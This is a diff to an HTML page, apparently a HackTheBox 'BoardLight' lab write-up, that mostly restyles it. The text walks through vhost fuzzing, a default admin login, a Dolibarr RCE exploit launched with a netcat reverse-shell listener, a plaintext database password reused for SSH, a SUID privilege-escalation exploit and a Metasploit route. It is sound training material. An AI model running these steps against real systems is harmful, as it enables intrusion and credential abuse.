@@ -172,6 +172,78 @@
     color: var(--muted);
     font-size: 0.85rem;
   }
+
+  :root { --user: #2563eb; --pass: #dc2626; }
+  @media (prefers-color-scheme: dark) {
+    :root { --user: #60a5fa; --pass: #f87171; }
+  }
+  /* Inline commands, paths and filenames: terminal look */
+  code {
+    display: inline;
+    background: #0b0f0b;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 5px;
+    padding: 0.1rem 0.4rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88em;
+    word-break: break-word;
+  }
+  /* Commands and replies: terminal box with a Copy button */
+  .terminal-box {
+    background: #000;
+    color: #39ff14;
+    border: 1px solid #1f2a1f;
+    border-radius: 8px;
+    padding: 0.9rem 1rem;
+    font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+    font-size: 0.88rem;
+    white-space: pre-wrap;
+    word-break: break-all;
+    overflow-wrap: break-word;
+  }
+  .terminal-wrapper { margin: 1.25rem 0; }
+  .terminal-header { display: flex; justify-content: flex-end; padding-bottom: 6px; }
+  .copy-btn {
+    font-size: 11px;
+    padding: 4px 10px;
+    border-radius: 4px;
+    cursor: pointer;
+    background: var(--code-bg);
+    border: 1px solid var(--border);
+    color: var(--link);
+  }
+  .copy-btn:hover { background: var(--accent); color: var(--bg); }
+  /* Credentials and flags: labelled boxes */
+  fieldset.cred-box, fieldset.flag-box {
+    border: 1px solid var(--border);
+    border-left: 4px solid var(--accent);
+    border-radius: 8px;
+    padding: 0.6rem 1rem 0.9rem;
+    margin: 1.25rem 0;
+    background: var(--card);
+  }
+  fieldset legend {
+    padding: 0 0.4rem;
+    font-size: 0.8rem;
+    font-weight: 600;
+    letter-spacing: 0.04em;
+    text-transform: uppercase;
+    color: var(--accent);
+  }
+  fieldset.flag-box {
+    background: #000;
+    border-color: #1f2a1f;
+    border-left: 4px solid #39ff14;
+    color: #39ff14;
+  }
+  fieldset.flag-box legend { color: #39ff14; }
+  fieldset.flag-box code { background: none; border: none; padding: 0; color: inherit; }
+  /* Usernames and passwords */
+  .user { color: var(--user); font-weight: 600; }
+  .pass { color: var(--pass); font-weight: 600; }
+  code .user { color: #60a5fa; }
+  code .pass { color: #f87171; }
 </style>
 </head>
 <body>
@@ -203,7 +275,7 @@
 </nav>
 
 <blockquote class="callout">
-  <div class="callout-title">Note</div>
+  <div class="callout-title">Key takeaways</div>
   <ul>
     <li><strong>Dolibarr app</strong> &rarr; <strong>RCE CVE-2023-30253</strong></li>
     <li><strong>Credentials in a .conf file</strong> &rarr; <strong>SSH with password spray</strong></li>
@@ -239,11 +311,15 @@
 <p>I used the command <code>ffuf -w ~/Downloads/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://board.htb/ -H 'Host: FUZZ.board.htb' -fs 15949</code>.</p>
 
 <h2 id="foothold">Foothold</h2>
-<p>Next, I added the vhost to my <code>/etc/hosts</code> file: <code>10.10.11.11 crm.board.htb</code>. This opened a login page. I tried <code>admin</code> : <code>admin</code>, and these were the right credentials. Once logged in, I looked for Dolibarr exploits and found <a href="https://github.com/Rubikcuv5/cve-2023-30253">CVE-2023-30253</a>, with an <code>exploit.py</code> script to get a reverse shell.</p>
+<p>Next, I added the vhost to my <code>/etc/hosts</code> file: <code>10.10.11.11 crm.board.htb</code>. This opened a login page. I tried the credentials below, and these were the right ones. Once logged in, I looked for Dolibarr exploits and found <a href="https://github.com/Rubikcuv5/cve-2023-30253">CVE-2023-30253</a>, with an <code>exploit.py</code> script to get a reverse shell.</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">admin</span> : <span class="pass">admin</span></code>
+</fieldset>
 <p>I opened a listener with <code>netcat -lvnp 4444</code> and ran <code>python3 exploit.py --url http://crm.board.htb -u admin -p admin -r My_IP 4444</code>, and I got the reverse shell.</p>
 
 <p>I upgraded the shell with these commands:</p>
-<pre><code class="language-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'
+<div class="terminal-box">python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 #Press Ctrl + Z
 
@@ -257,10 +333,10 @@ export TERM=xterm
 
 export SHELL=bash
 
-stty rows 40 columns 100</code></pre>
+stty rows 40 columns 100</div>
 
 <h2 id="user">User Access</h2>
-<p>After searching for a while, I found the name of a user in <code>/etc/passwd</code>: <code>larissa</code>.</p>
+<p>After searching for a while, I found the name of a user in <code>/etc/passwd</code>: <span class="user">larissa</span>.</p>
 
 <figure>
   <!-- Screenshot referenced in source note as "Pasted image 20240928200532.png" (/etc/passwd listing) - file not found in vault attachments, so it could not be embedded. -->
@@ -274,34 +350,42 @@ stty rows 40 columns 100</code></pre>
   <figcaption>Screenshot placeholder: conf.php contents (image file not found in the vault)</figcaption>
 </figure>
 
-<p>The password for <code>dolibarrowner</code> was <code>serverfun2$2023!!</code>. This was also the password for SSH with the <code>larissa</code> user.</p>
-<p>So I connected with <code>ssh larissa@10.10.11.11</code> and the password <code>serverfun2$2023!!</code>. There I got the user flag.</p>
+<p>The password for <span class="user">dolibarrowner</span> was <span class="pass">serverfun2$2023!!</span>. This was also the password for SSH with the <span class="user">larissa</span> user.</p>
+<fieldset class="cred-box">
+  <legend>Credentials</legend>
+  <code><span class="user">dolibarrowner</span> : <span class="pass">serverfun2$2023!!</span></code><br>
+  <code><span class="user">larissa</span> : <span class="pass">serverfun2$2023!!</span></code>
+</fieldset>
+<p>So I connected with <code>ssh larissa@10.10.11.11</code> and the password <span class="pass">serverfun2$2023!!</span>. There I got the user flag.</p>
 
 <h2 id="privesc">Privilege Escalation</h2>
 <p>Now we can start searching for local privilege escalation. I used this command:</p>
-<pre><code class="language-bash">find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</code></pre>
+<div class="terminal-box">find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null</div>
 
 <p>We can find some non-default SUID binaries.</p>
-<pre><code class="language-text">-rwsr-xr-x 1 root root 26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
+<div class="terminal-box">-rwsr-xr-x 1 root root 26944 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
 -rwsr-xr-x 1 root root 14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
--rwsr-xr-x 1 root root 14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</code></pre>
+-rwsr-xr-x 1 root root 14648 Jan 29  2020 /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight</div>
 
 <p>By searching the web we can see that a <a href="https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit/blob/main/exploit.sh">CVE-2022-37706</a> exists.</p>
 <p>We copy the <code>exploit.sh</code> file and we set it on the <code>larissa</code> SSH session to get root access.</p>
-<pre><code class="language-bash">vi exploit.sh (paste the exploit and close the vi with :qw )
+<div class="terminal-box">vi exploit.sh (paste the exploit and close the vi with :qw )
 chmod +x exploit.sh
-./exploit.sh</code></pre>
+./exploit.sh</div>
 
 <p>And we get the root.</p>
-<pre><code class="language-text">[REDACTED]</code></pre>
+<fieldset class="flag-box">
+  <legend>Root Flag</legend>
+  <code>[REDACTED]</code>
+</fieldset>
 
 <p>There is also another way to get root with linpeas and msfconsole.</p>
 <p>The first thing I did was send linpeas over:</p>
-<pre><code class="language-bash">scp linpeas.sh larissa@10.10.11.11:~</code></pre>
+<div class="terminal-box">scp linpeas.sh larissa@10.10.11.11:~</div>
 <p>Now <code>larissa</code> has <code>linpeas.sh</code> in her home directory. (I could have put it in <code>/tmp</code> instead, but since this is a lab machine, it doesn't matter.)</p>
 <p>I made it executable with <code>chmod +x linpeas.sh</code>, then ran it with <code>./linpeas.sh</code>.</p>
 <p>From my machine, I opened <code>msfconsole</code> and searched:</p>
-<pre><code class="language-msfconsole">msf6 &gt; search auxiliary/scanner/ssh/ssh_login</code></pre>
+<div class="terminal-box">msf6 &gt; search auxiliary/scanner/ssh/ssh_login</div>
 <p>I used the auxiliary module and set the options (username, password, RHOST).</p>
 <p>I found CVE-2022-37706, so I decided to try it.</p>
 
@@ -312,11 +396,9 @@ chmod +x exploit.sh
 
 <p>I set the options and ran the exploit. I got a <code>meterpreter</code> session. I used <code>shell</code>, then went straight to <code>cd /root</code>, where I found <code>root.txt</code>.</p>
 
-<footer>
-  <p>HTB machine: BoardLight (retired status to be confirmed by author before publishing). Polished write-up generated from the author's notes.</p>
-</footer>
 
 </div>
+<script src="/copy.js"></script>
 <script src="/nav.js"></script>
 </body>
 </html>
